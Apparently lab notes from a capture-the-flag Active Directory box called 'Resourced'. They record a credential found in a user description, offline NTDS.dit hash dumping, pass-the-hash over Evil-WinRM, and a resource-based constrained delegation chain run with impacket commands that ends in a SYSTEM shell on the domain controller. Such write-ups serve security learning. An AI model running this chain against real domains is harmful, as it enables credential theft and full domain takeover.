# Resourced: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3389, 5985
- **Domain**: `RESOURCED.LOCAL`
- **Host**: `RESOURCEDC`

### Enumeration (Initial Foothold)
1. **Enum4linux**: Found user descriptions.
2. **Result**: `V.Ventz` has a reminder in his description: `HotelCalifornia194!`.
3. **Creds**: `V.Ventz:HotelCalifornia194!`

---

## Pivoting & Lateral Movement

### Offline NTDS.dit Dumping
1. **SMB Share Access**: `V.Ventz` has access to "Password Audit" share.
2. **Files Captured**: `ntds.dit`, `SYSTEM`, `SECURITY`.
3. **Execution** (secretsdump):
   ```bash
   impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
   ```
4. **Result**: All domain NTLM hashes dumped.
5. **Pivot**: Used `L.Livingstone` hash to gain shell via Evil-WinRM.
   ```bash
   evil-winrm -i 10.10.10.10 -u L.Livingstone -H [NTHASH]
   ```

---

## Privilege Escalation (Domain Admin)

### RBCD (Resource-Based Constrained Delegation)
1. **Enumeration** (BloodHound):
   `L.Livingstone` has **GenericAll** over the Computer object `RESOURCEDC$`.
2. **Step 1: Add a Machine Account**:
   ```bash
   impacket-addcomputer -dc-ip 10.10.10.10 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!' resourced.local/l.livingstone -hashes :[NTHASH]
   ```
3. **Step 2: Set Delegation Rights** (RBCD):
   ```bash
   impacket-rbcd -dc-ip 10.10.10.10 -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$' -action write 'resourced.local/l.livingstone' -hashes :[NTHASH]
   ```
4. **Step 3: Get Service Ticket** (S4U2Self/S4U2Proxy):
   ```bash
   impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator 'resourced/ATTACK$':'AttackerPC1!' -dc-ip 10.10.10.10
   ```
5. **Step 4: Execute with Ticket**:
   ```bash
   export KRB5CCNAME=Administrator.ccache
   # Add to /etc/hosts: 10.10.10.10 resourcedc.resourced.local
   impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 10.10.10.10
   ```
6. **Result**: System shell on the DC.
